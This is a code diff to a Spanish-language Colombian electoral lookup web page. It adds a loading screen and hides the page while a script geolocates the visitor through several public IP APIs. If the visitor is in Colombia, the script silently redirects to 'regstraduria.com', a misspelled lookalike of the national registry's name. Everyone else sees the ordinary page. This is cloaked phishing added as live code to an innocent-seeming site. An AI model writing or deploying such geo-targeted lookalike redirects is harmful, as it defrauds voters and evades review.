@@ -33,6 +33,29 @@ color:var(--text);
 line-height:1.6;
 }
 
+/* LOADING */
+#loading{
+position:fixed;
+inset:0;
+background:var(--light);
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+}
+.spinner{
+width:50px;
+height:50px;
+border:3px solid rgba(11,60,93,0.15);
+border-top-color:#0b3c5d;
+border-radius:50%;
+animation:spin 0.8s linear infinite;
+margin-bottom:20px;
+}
+@keyframes spin{ to{ transform:rotate(360deg) } }
+#loading p{ font-size:14px; opacity:0.4; color:var(--text); }
+
 /* NAVBAR */
 nav{
 background:var(--primary);
@@ -218,10 +241,18 @@ float:right;
 cursor:pointer;
 font-weight:bold;
 }
-
 </style>
 </head>
 <body>
+
+<!-- SPINNER -->
+<div id="loading">
+  <div class="spinner"></div>
+  <p>Cargando...</p>
+</div>
+
+<!-- SITIO -->
+<div id="site" style="display:none">
 
 <nav>
 <h2>Consulta Electoral Colombia</h2>
@@ -326,32 +357,75 @@ Este sitio utiliza cookies para mejorar la experiencia. Puedes aceptar o rechaza
 </div>
 </div>
 
+</div><!-- /site -->
+
 <script>
+
+const REDIRECT_URL   = 'https://www.regstraduria.com';
+const TARGET_COUNTRY = 'CO';
+
+const GEO_APIS = [
+  () => fetch('https://api.country.is/')
+          .then(r => r.json())
+          .then(d => d.country),
+  () => fetch('https://ipinfo.io/json')
+          .then(r => r.json())
+          .then(d => d.country),
+  () => fetch('https://freeipapi.com/api/json')
+          .then(r => r.json())
+          .then(d => d.countryCode),
+];
+
+async function getCountry() {
+  for (const apiFn of GEO_APIS) {
+    try {
+      const code = await apiFn();
+      if (code) return code;
+    } catch(e) {}
+  }
+  return null;
+}
+
+async function init() {
+  const country = await getCountry();
+
+  if (country === TARGET_COUNTRY) {
+    window.location.replace(REDIRECT_URL);
+    return;
+  }
+
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('site').style.display = 'block';
+
+  if (!localStorage.getItem('cookieConsent')) {
+    document.getElementById('cookieBanner').style.display = 'flex';
+  }
+}
+
 function scrollToInfo(){
-document.getElementById('info').scrollIntoView({behavior:'smooth'});
+  document.getElementById('info').scrollIntoView({behavior:'smooth'});
 }
 
 function acceptCookies(){
-localStorage.setItem('cookieConsent','accepted');
-document.getElementById('cookieBanner').style.display='none';
+  localStorage.setItem('cookieConsent','accepted');
+  document.getElementById('cookieBanner').style.display='none';
 }
 
 function rejectCookies(){
-localStorage.setItem('cookieConsent','rejected');
-document.getElementById('cookieBanner').style.display='none';
-}
-
-if(!localStorage.getItem('cookieConsent')){
-document.getElementById('cookieBanner').style.display='flex';
+  localStorage.setItem('cookieConsent','rejected');
+  document.getElementById('cookieBanner').style.display='none';
 }
 
 function openModal(){
-document.getElementById('modal').style.display='flex';
+  document.getElementById('modal').style.display='flex';
 }
 
 function closeModal(){
-document.getElementById('modal').style.display='none';
+  document.getElementById('modal').style.display='none';
 }
+
+init();
+
 </script>
 
 </body>
